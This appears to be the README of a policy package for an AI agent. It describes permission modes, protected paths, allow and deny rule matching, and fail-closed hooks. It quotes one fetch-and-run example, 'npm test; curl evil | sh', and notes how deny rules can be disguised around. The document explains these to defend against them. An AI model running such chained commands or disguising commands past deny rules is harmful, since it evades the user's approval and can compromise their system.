# @cortex/policy

What is allowed to happen during an agent turn: **permission modes and rules** decide whether a tool call runs, is refused, or needs approval, and **hooks** let the user veto or observe it. Decisions depend on a tool's `kind` (`read` / `edit` / `execute`), never its name, so adding a tool never means touching policy.

## Modes

| Mode | `read` | `edit` | `execute` |
| --- | --- | --- | --- |
| `default` | allow | ask | ask |
| `acceptEdits` | allow | allow | ask |
| `plan` | allow | deny | deny |
| `bypassPermissions` | allow | allow | allow |

Precedence: **deny rules** → `bypassPermissions` → `plan` → **protected paths** → **allow rules** → reads → `acceptEdits` → ask. A deny rule beats everything, including `bypassPermissions`; `plan` ignores allow rules.

**Protected paths.** An edit that touches `.cortex/settings.json` or anything in `.git/` (`PROTECTED_PATHS`) always asks: in `default` and `acceptEdits` mode and whatever the allow rules say. Those are where a hook, an MCP server or a git hook would be planted to run later, outside the approval prompt, so "let it edit files" must not quietly mean that. The path is judged however it is written (other letter case, `./`, backslashes, `src/../.git`, and any Windows short name such as `GIT~1`), and either end of a move or copy counts. `plan` still denies, a deny rule still denies, and `bypassPermissions` still allows (the user has chosen to be asked about nothing).

## Rules

`tool_name`, or `tool_name(pattern)` matched against the call's main argument (the command, else the path):

```
run_command                 any call of that tool
run_command(npm test)       exactly that command
run_command(npm test:*)     "npm test", alone or followed by arguments (not "npm testing")
run_command(npm test*)      a command starting with "npm test"
read_file(src/*)            a path starting with "src/"
```

A wildcard is a promise about a *kind* of call, so allow and deny rules hold it differently:

- **Allow rules** cover only a plain command. A command with a shell control character in it (`; & | < > ( ) $` `` ` `` `^ %`, or a line break) can do something else as well, so a wildcard allow rule never covers it and the user is asked instead (`npm test; curl evil | sh` is not "npm test"). A rule with no wildcard is plain equality, so "don't ask again for this exact command" still means exactly that. Paths are compared as the tool will use them (`src/../.git/config` is not under `src/`), and a call that names several paths (`move_file`, `copy_file`) needs all of them to match.
- **Deny rules** look past other ways of writing the same command: leading whitespace, letter case, `/bin/rm` and `rm.exe`, quotes, `sudo`/`env`/`nohup` and variable assignments in front, each command of `a && b`, `$(…)` and backticks, and the argument of `bash -c` / `cmd /c` / `eval` (a few levels deep). A path is matched as written and as normalised, and a move or copy is denied if either end matches. **This is best effort, not a sandbox**: a determined command can always be disguised further (`find -exec`, a script that calls `rm`), so a deny rule lowers risk and the approval prompt remains the real gate.

## Hooks

Shell commands registered per event: `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`. A hook receives the event as JSON on stdin (`hook_event_name`, plus `tool_name`, `tool_input`, `tool_response` or `prompt`). **Exit code 2 blocks**, and its stderr (at most 64 KiB of it) is fed back to the model; any other exit code is ignored. `matcher` is a tool-name regex matched against the whole name, and one that is not a valid regular expression is an error when the settings load.

**A hook that cannot do its job fails closed.** For the two hooks that gate something, `PreToolUse` and `UserPromptSubmit`, a hook that **cannot be started, is not found (the shell's exit code 126 or 127), does not finish in 60 s, or is killed by a signal** blocks, and the message says why: a check that never ran has not approved anything, and a hook that crashes quietly must not turn a safety check into a no-op. `PostToolUse` and `Stop` run after the fact, so a failure there blocks nothing. A hook that ran and exited with any other non-zero code is still ignored, so a linter-style hook that exits 1 keeps working. (On Windows `cmd.exe` reports a missing command as exit code 1, which cannot be told from a hook that chose to exit 1; a hook whose command is missing is not detected there.) A hook that outlives its timeout is not waited for, and its output is drained as it runs, so a chatty hook cannot hang it.

## API

`decidePermission(tool, input, mode, rules)`, `matchRule`, `primaryArgument` (the argument a rule's pattern is matched against), `isPermissionMode`, `PERMISSION_MODES`, `runHooks(hooks, event, payload, cwd)`, and the types `PermissionMode`, `PermissionRules`, `Decision`, `HookDef`, `HookEvent`, `HookOutcome`.

## Files

`types.ts` · `permissions.ts` · `hooks.ts`. Depends on `@cortex/tools` for the `ToolKind` type only.

Tests: `npm test -w @cortex/policy`.
